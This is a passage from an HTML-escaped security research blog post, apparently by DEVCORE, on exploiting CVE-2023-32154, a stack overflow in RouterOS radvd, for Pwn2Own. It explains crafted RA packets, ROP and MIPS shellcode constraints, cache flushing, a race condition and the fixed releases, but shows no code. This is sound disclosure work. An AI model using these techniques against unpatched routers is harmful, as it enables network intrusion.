&lt;p&gt;In case 2, handler 1 will register a timer, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt;, after initialization:
&lt;img src=&quot;/assets/img/blog/20240524/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt; is used to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; at regular intervals to broadcast packets:
&lt;img src=&quot;/assets/img/blog/20240524/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2023-32154&quot;&gt;CVE-2023-32154&lt;/h2&gt;

&lt;p&gt;After digging deeper into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt;, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; has a vulnerability in handling DNS advisory. First, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will store the DNS advisory from the RA received from the upstream router (the data structure is a tree), and when it wants to broadcast the RA to the LAN, these DNS will also be wrapped in the RA and broadcast to the LAN.&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, it is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; function that expands the tree and puts it into the ICMPv6 packet. In the following figure, the first parameter of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RA_raw&lt;/code&gt;, is a buffer of 4096 bytes, which is the final ICMPv6 packet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Stepping into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt;, we can immediately see that there may be a stack buffer overflow here. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; puts DNS into ICMPv6 packets via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; without any boundary check, and as long as the DNS advisory is big enough, it can trigger a stack buffer overflow.
&lt;img src=&quot;/assets/img/blog/20240524/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The DNS records used here come from the RDNSS field in the RA packet, but according to the RFC, we can find that the field used to describe the length of RDNSS is only 8-bit. It can cover only 255*16 bytes at most, and this length is insufficient for us to overwrite the return address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But if this is not the first time the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; received RA, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; needs to mark the old DNS as expired in the next packet, so we can actually cover twice the length, which is 255*16*2 bytes. That is enough for us to overwrite the return address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;attacking&quot;&gt;Attacking&lt;/h2&gt;

&lt;p&gt;Now, the attacker only needs to send two crafted RA packets with RDNSS field length of 255 to the target RouterOS, and the attacker can control the execution flow of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; program through the IPv6 address in the RDNSS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-protection-of-binaries&quot;&gt;The Protection of Binaries&lt;/h3&gt;

&lt;p&gt;Since the architecture of target RouterOS is MIPS architecture, the CPU doesnâ€™t support NX, but other protections are also not enabled.&lt;/p&gt;

&lt;p&gt;So itâ€™s just a matter of finding a good ROP gadget and letting the execution flow eventually jump to the shellcode we place on the stack, easy peasy lemon squeezy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-constraint-of-shellcode&quot;&gt;The Constraint of Shellcode&lt;/h3&gt;

&lt;p&gt;However, there are actually quite a number of limitations in the process of constructing an exploit, for example, since IPv6 addresses are stored in a tree structure, they are sorted before being placed on the stack, so we need to make sure that the payload we build remains the same after sorting.&lt;/p&gt;

&lt;p&gt;The simplest way to do this is to make the IPv6 prefix to be a serial number, which ensures that the contents of our payload are in order, and that we can accurately jump to the shellcode through the ROP gadget. When writing the shellcode, we just need to construct the suffix of each address as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt;, so that we can skip the non-executable  serial number.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, due to the delay slot in MIPS, the CPU will actually execute the next instruction of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; instruction first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we have to move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; forward, but since we canâ€™t use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; command in the delay slot, the payload will be a pain to construct, and may exceed the length we can use, which is basically a bad idea.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, this is a common beginner level problem in CTF. All we need is to make the prefix of IPv6 address a legal instruction that does not affect the execution result. We change the prefix to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 3&lt;/code&gt;â€¦â€¦ and so on. In addition to the payloads being sorted, it also saves the space that would otherwise be used for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; instructions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But since we didnâ€™t leak the stack address, and since we canâ€™t find any gadgets available to move the stack address from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$sp&lt;/code&gt; register to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t9&lt;/code&gt; register, what weâ€™ve done here is to first write the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jalr $sp&lt;/code&gt; instruction to memory via a ROP gadget, and then jump to it and execute it with a ROP gadget, which then directs the flow to the shellcode that weâ€™ve constructed, and that sounds pretty good:
&lt;img src=&quot;/assets/img/blog/20240524/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But this is not enough to run shellcode, because MIPS has two different cache for memory access.&lt;/p&gt;

&lt;h3 id=&quot;cache&quot;&gt;Cache&lt;/h3&gt;

&lt;p&gt;MIPS has two caches: I-cache (instruction cache) and D-cache (data cache).&lt;/p&gt;

&lt;p&gt;When we write the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; instruction to the memory, itâ€™s actually written to D-cache.
&lt;img src=&quot;/assets/img/blog/20240524/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we control the execution flow to jump on the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt;, the processor will first check whether the instruction at this address is in the I-cache or not, and since we jump to a data section, the cache will always miss it. And so, the contents of the memory will be loaded into the I-cache.
&lt;img src=&quot;/assets/img/blog/20240524/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, since the contents of the D-cache have not been written back to memory, I-cache will only copy a bunch of null bytes from memory, which is nop in MIPS, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; only runs a bunch of nop until it crashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we need to make the processor write the contents of the D-cache back to memory, and there are two ways to do this: a context switch or exhausting the D-cache space (32 KB).&lt;/p&gt;

&lt;p&gt;Triggering a context switch is easier, but there is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; that we can use to trigger a context switch, and while other functions can trap into the kernel, the chances of a context switch occurring are not very high. In order to compete for the Pwn2Own, it is necessary to have a consistent attack that is close to 100% successful. Therefore, we turned to find a way to exhaust the 32kb D-cache.&lt;/p&gt;

&lt;p&gt;First , a simple check shows that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radomize_va_space&lt;/code&gt; variable of RouterOS is 1, which means that the memory address of the heap is not random, so we donâ€™t need a leak to know where the heap is. We just need to find a way to make the heap allocate enough space, and then write some gibberish on it to deplete the 32kb D-cache.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, since there are no good ROP gadgets, such a payload will need too many ROP gadgets, and eventually the payload length may exceed the length we can cover.&lt;/p&gt;

&lt;p&gt;Luckily, as mentioned earlier, DNS itself is stored in a tree structure, so it already occupies a large chunk of memory in the heap. Through the step-by-step execution of gdb, we can make sure that by the time DNS is being processed, the heap is already bigger than 32kb, so we just need to call memcpy to write 32kb of gibberish to the heap through the GOT hijack and thatâ€™s it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, our exploit is complete:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Combined with another Canon printer vulnerability we found for Pwn2Own, the attack flow would be:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The attacker, as a bad neighbor of the router, sends crafted ICMPv6 packets to it&lt;/li&gt;
  &lt;li&gt;After successfully controlling the router, we perform port forwarding to direct the payload to the Canon printer on the LAN.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In a Pwn2Own environment, the network environment can be simplified a bit as follows:
&lt;img src=&quot;/assets/img/blog/20240524/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;debugging-for-exploit&quot;&gt;Debugging for Exploit&lt;/h2&gt;

&lt;p&gt;Just when we thought we had the $100,000 prize in the pocket, something unexpected happened: our exploit failed on Ubuntu, whether it was a virtual machine in MacOS or an Ubuntu machine; and Pwn2Own officials, who basically used Ubuntu to execute our exploit, so we had to solve this problem.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tried running the exploit on MacOS and recording the network traffic, then replaying the traffic on Ubuntu, and we can observe that the replay fails:
&lt;img src=&quot;/assets/img/blog/20240524/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also tried running the exploit on Ubuntu and recording the network traffic, of course it failed on Ubuntu. But when we replayed the failed traffic on MacOS, it succeeded:
&lt;img src=&quot;/assets/img/blog/20240524/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Up to this point, we guessed that one of the OSes reordered the packets before sending them out, and that might have been done after Wireshark captured the packets. So we wrote a sniffer and put it on the router to monitor the traffic, and the result should be very reliable since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_PACKET&lt;/code&gt; type of sockets are not affected by the firewall rules:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the packets recorded from both sides are &lt;strong&gt;exactly the same&lt;/strong&gt; â€¦â€¦&lt;/p&gt;

&lt;p&gt;So, apparently Iâ€™m the bus factor now. Exploit has only worked on my macOS so far, and if the situation remains, the last resort would be to fly myself to Toronto with my Mac laptop and do the attack on site with my own laptop. But thereâ€™s no way weâ€™re going to leave this problem of unknown cause unattended, who knows if it might happen to my laptop during the Pwn2Own as well, and that would be a real loss.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few careful reviews, we finally know the cause of the problem: speed. Since the time window between the two RA packets is not that big, itâ€™s hard to tell from the Wireshark timeline, but if you do some math, youâ€™ll see that the difference in time between the two packets &lt;strong&gt;is 390 times&lt;/strong&gt;. So the problem is not with Ubuntu, itâ€™s because the Mac sent the two packets too fast, and accidentally triggered the race condition in radvd (plus I didnâ€™t properly calculate how many bytes it takes to overwrite the return address, I just wrote all the gibberish on it and did a pattern match. So the offset is only correct under the race condition).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The solution is to sleep for a while between sending two RA packets and fix the offset in the payload, which will stabilize our attack with a 100% chance of success.&lt;/p&gt;

&lt;h3 id=&quot;fix&quot;&gt;Fix&lt;/h3&gt;

&lt;p&gt;This vulnerability has been fixed in the following releases:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8, 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the same time, we also found that this vulnerability has existed since RouterOS v6.0. From the official website can be found 6.0 release date is 2013-05-20, that is to say, this vulnerability has existed there &lt;strong&gt;nine years&lt;/strong&gt;, but no one has found him.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Echoing our initial thought, â€œNo one with sanity would like to dive into the details of nova binaryâ€, Q.E.D.&lt;/p&gt;

&lt;h2 id=&quot;the-race-condition&quot;&gt;The Race Condition&lt;/h2&gt;

&lt;p&gt;But how did this race condition that prevents us from easily earning $100,000 happen? As mentioned above, nova binary has a Looper that loops for dealing with events, i.e. itâ€™s a single thread program, so whatâ€™s the race condition all about? (Some nova binary is multi-fiber, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; isnâ€™t.)&lt;/p&gt;

&lt;p&gt;I didnâ€™t mention that when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; parse the RA packets received from WAN, the DNS is stored in a â€œvectorâ€, but when preparing the RA packets for broadcasting on LAN, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; expands a â€œtreeâ€ with DNS stored in it, so what is the relationship between this vector and the tree?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thatâ€™s why we didnâ€™t find the logic â€œbroadcasts RA packets to the LAN when it receives RA from the WANâ€ in the callback, because itâ€™s the result of the interaction between the two processes.&lt;/p&gt;

&lt;p&gt;If we take a closer look at what the callback does, we can see that there is an array that holds an object called the â€œremote objectâ€. The code looks intuitive, it iterates over a vector of DNS addresses, calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::roDNS&lt;/code&gt; once for each DNS address, and saves the result of the function execution in the and saves the result of the function execution in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS_remoteObject&lt;/code&gt; vector.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-object&quot;&gt;Remote Object&lt;/h3&gt;

&lt;p&gt;So what is a remote object? Remote object is a mechanism used in RouterOS to share resources across processes, one process is responsible for storing this shared resource, then another process can send requests to the process responsible for storing it to make additions, deletions, and modifications by specifying the ids. For example, the DNS remote object is actually placed in handler 2 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; process, while handler 1 of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; simply keeps the ids of these objects.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;subscription-and-notification&quot;&gt;Subscription and Notification&lt;/h3&gt;

&lt;p&gt;When a remote object is updated, some process may want to respond, so the nova binary can subscribe to other nova binary in advance. Take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; for example, handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; is responsible for managing the ipv6 address pool, the dhcp process subscribes to handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt;, so when there are changes in the ipv6 address pool, dhcp can check whether they need to be processed further, such as shutting down a dhcp server.&lt;/p&gt;

&lt;p&gt;The subscription behavior is achieved by sending a nova message to the binary that wants to subscribe, with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_NOTIFYCMD&lt;/code&gt; that contains the specific conditions that it wants to be notified about.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When another process adds an object to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt;, handler 1â€™s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; function will be executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In most cases, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendNotifies&lt;/code&gt; to notify subscribers who have subscribed to the 0xfe000b event that their subscribed objects have been altered, so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; here sends a nova message to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process informing it of the result of the object being altered.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After understanding the subscription mechanism, we can more fully understand the interaction between radvd and the resolver as follows:&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives the RA packet from the WAN, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; for each IPv6 address. Handler 4 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; handles this request and creates the corresponding ipv6 object in handler 2. Then, because handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; subscribes to handler 2 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, handler 2 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; pushes all the DNS addresses that it has to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, then handler 1 constructs a RA packet based on the DNS address he received, and then broadcasts the packet on the LAN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-root-cause-of-race-condition&quot;&gt;The Root Cause of Race Condition&lt;/h3&gt;

&lt;p&gt;The problem is actually in the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt;, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; to send a nova message. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; is non-blocking, meaning that the remote object in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; doesnâ€™t immediately know what id of a remote object corresponds to in the resolver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If our second packet arrives too soon, so that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; doesnâ€™t know what the remote objectâ€™s id is, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; canâ€™t delete these objects in the first place, it can only mark them as destroyed for soft deletion, which results in a race condition.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Letâ€™s try to understand the whole process step by step:&lt;/p&gt;

&lt;p&gt;First, since both processes are single thread, we can assume that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; are in their first loop. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives an RA from the WAN with only one DNS address, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; sends a request for creating a remote object to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; will set a timer when it receives the first request, because in the IPC mechanism, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; has no way of knowing how many &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; requests belong to the same group, so it simply sets a timer , and sends out a notification when the time is up. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; should reply with a nova message as a response, informing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; of the id of the remote object that has just been added, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will register a corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; to handle this request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, if the second RA packet is delivered so fast that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; hasnâ€™t sent the response back yet, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; can only mark the old DNS remote object as destroyed for soft deletion first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; proceeds to create a new DNS remote object for the RDNSS field in the second RA packet received, but since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; hasnâ€™t finished the first iteration yet, this new request stays in the socket until the next iteration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, the first iteration ends by passing back an id to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;â€™s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; will update the remote object based on the id it gets. But since the corresponding remote object has been marked for deletion, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; will delete the object instead of updating the object id.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; deletes the remote object saved in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, it will send a delete object message to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, informing it that the corresponding remote object is no longer in use and has to be deleted, but the request will still be stuck in the socket waiting to be processed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; then proceeds to the second iteration, where it gets a request from the socket to create a remote object for the second RA.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, the previously set timer expires and the resolver calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::sendChanges&lt;/code&gt; to notify all subscribers what DNSs the resolver now knows about, since object 1 has not been deleted yet, so the resolver pushes the DNS that was created by the two requests. The DNS created by the two requests will be pushed out.&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives this information, it immediately constructs a RA packet to broadcast over the LAN, and the results of the two requests are mixed together, which is why our attack only succeeds on MacOS in the first place.&lt;/p&gt;

&lt;p&gt;The race condition itself sounds hard to be triggered (it wonâ€™t be triggered if the delete request is processed before the timer), but this is because the whole process has been greatly simplified for ease of explanation, and in fact, as long as the time between the arrival of the two packets is short enough, the race will be successful.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;summary-1&quot;&gt;Summary&lt;/h3&gt;

&lt;p&gt;Through the above analysis, we found a pattern of race conditions in the remote object mechanism of RouterOS:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use non-blocking methods to create/delete the remote object&lt;/li&gt;
  &lt;li&gt;Subscribe to the remote object&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Because it is possible to mix the results of two requests into a single response, this could possibly be used to bypass some security checks. If we can find such a vulnerability, it could be used to participate in the router category.&lt;/p&gt;

&lt;p&gt;In the end, we were pressed for time and we didnâ€™t find any exploitable vulnerabilities through the race condition.&lt;/p&gt;

&lt;p&gt;And not only that, we realized that the exploit that we had tested hundreds of times over the past few months still had some issues, and we still couldnâ€™t get it to work three hours before the registration deadline. We kept updating the exploit and the white paper we were going to submit, and it was done until half an hour before the deadline (4:00 AM deadline).&lt;/p&gt;

&lt;p&gt;But luckily, we were able to complete the attack with only one attempt at Pwn2Own, becoming the first team in history to complete the new category of SOHO SMASHUP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We earned 10 Master of Pwn points and $100,000 by this category, and at the end of the tournament, DEVCORE was crowned the winner with 18.5 Master of Pwn points.
&lt;img src=&quot;/assets/img/blog/20240524/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In addition to receiving the Master of Pwn title, trophy, and jacket, the organizers will also send us one of each of the devices we hacked.&lt;/p&gt;

&lt;p&gt;(We canâ€™t fit all of them into a picture)
&lt;img src=&quot;/assets/img/blog/20240524/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

